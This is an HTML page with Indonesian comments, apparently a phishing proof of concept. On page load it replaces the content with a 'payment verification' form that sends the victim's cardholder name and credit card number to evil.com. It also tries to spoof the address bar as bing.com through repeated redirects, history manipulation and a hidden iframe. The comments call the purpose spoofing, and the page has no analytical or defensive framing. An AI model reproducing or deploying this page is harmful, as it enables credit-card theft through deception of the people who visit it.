<!DOCTYPE html>
<html lang="en">
<head>
    <title>Verifikasi Pembayaran</title>
</head>
<body>
    <script>
        function startSpoof() {
            // Langkah 1: Ganti seluruh konten halaman dengan form kartu kredit sederhana
            document.body.innerHTML = `
                <h2>Masukkan Informasi Kartu Kredit Anda untuk Verifikasi Pembayaran</h2>
                <form method="POST" action="https://evil.com/submit" autocomplete="on">
                    <label for="name">Nama di Kartu:</label><br>
                    <input type="text" id="name" name="name" placeholder="Nama Lengkap" autocomplete="name" required><br><br>
                    
                    <label for="cc-number">Nomor Kartu Kredit:</label><br>
                    <input type="text" id="cc-number" name="cc-number" placeholder="1234 5678 9012 3456" autocomplete="cc-number" required><br><br>
                    
                    <input type="submit" value="Verifikasi Pembayaran">
                </form>
            `;

            // Langkah 2: Spoofing URL address bar ke `bing.com`
            document.location = "https://bing.com:1234";
            setInterval(function() {
                document.location = "https://bing.com:1234";
            }, 11000);  // Interval untuk menjaga spoofing URL

            // Langkah 3: Manipulasi history untuk menjaga URL di address bar
            history.pushState({}, "Bing.com - Verifikasi Pembayaran", "/");

            // Langkah 4: Gunakan iframe tersembunyi untuk menjaga konsistensi URL spoofing
            let hiddenFrame = document.createElement("iframe");
            hiddenFrame.style.display = "none";
            hiddenFrame.src = "https://bing.com";
            document.body.appendChild(hiddenFrame);

            setInterval(function() {
                hiddenFrame.src = "https://bing.com";
            }, 15000); // Interval untuk iframe lebih panjang
        }

        // Eksekusi spoofing secara otomatis
        startSpoof();
    </script>
</body>
</html>
